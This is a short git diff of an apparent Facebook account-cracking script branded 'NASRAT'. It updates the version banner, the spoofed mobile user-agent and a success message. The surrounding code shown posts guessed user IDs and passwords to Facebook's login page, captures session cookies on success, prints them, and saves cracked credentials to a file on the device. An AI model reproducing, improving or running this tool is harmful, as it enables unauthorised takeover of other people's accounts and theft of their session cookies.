@@ -180,7 +180,7 @@ logo =                                          f"""{H}                         
  [◇] GITHUB     : Nasrat99845.git
  [◇] FACEBOOK   : Loy Rayess kabul
  [◇] STATUS     : Free
- [◇] VIRSION    : 2.1
+ [◇] VIRSION    : 2.2
  [◇]  TEAM      :   NASRAT& ARYAN
  [◇]------------------------------------------------------
 \033[1;37mTELEGRAM GROUP (HACKIN TECH{ M }\033[1;37m 
@@ -326,14 +326,14 @@ def rcrack(uid,pwx,tl):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41',}
+    'user-agent':'Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG SM-N960N) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36',}
 
             lo = session.post('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8/',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('    \033[1;32m(NASRAT➥ -OK)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
+                print('    \033[1;32m(NASRAT➟✔OK)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                 cek_apk(session,coki)
                 open('/sdcard/NASRAT-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
